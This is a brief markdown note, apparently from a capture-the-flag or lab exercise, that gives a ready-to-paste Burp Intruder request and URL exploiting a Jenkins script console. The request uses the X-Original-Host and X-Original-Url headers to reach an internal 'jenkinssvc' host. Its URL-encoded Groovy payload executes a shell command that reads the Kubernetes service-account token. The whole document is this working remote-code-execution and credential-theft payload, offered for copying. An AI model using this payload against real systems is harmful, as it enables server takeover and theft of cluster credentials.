# Example jenkinssvc exploits

exmample full request to send inside of intruder for Burp.

```text
POST / HTTP/1.1
Host: api.arrrspace.wtf
Content-Length: 0
X-Original-Host: http://jenkinssvc:8080
X-Original-Url: /scriptText?script=def+command%3d"cat+/var/run/secrets/kubernetes.io/serviceaccount/token"%3bdef+proc%3dcommand.execute()%3bproc.waitFor()%3bprintln("${proc.in.text}")%3b%2f%2f
Content-Type: application/x-www-url-formencoded
Accept: */*
Connection: close
```

example url to copy, if you only want that.

```text
/scriptText?script=def+command%3d"cat+/var/run/secrets/kubernetes.io/serviceaccount/token"%3bdef+proc%3dcommand.execute()%3bproc.waitFor()%3bprintln("${proc.in.text}")%3b%2f%2f
```
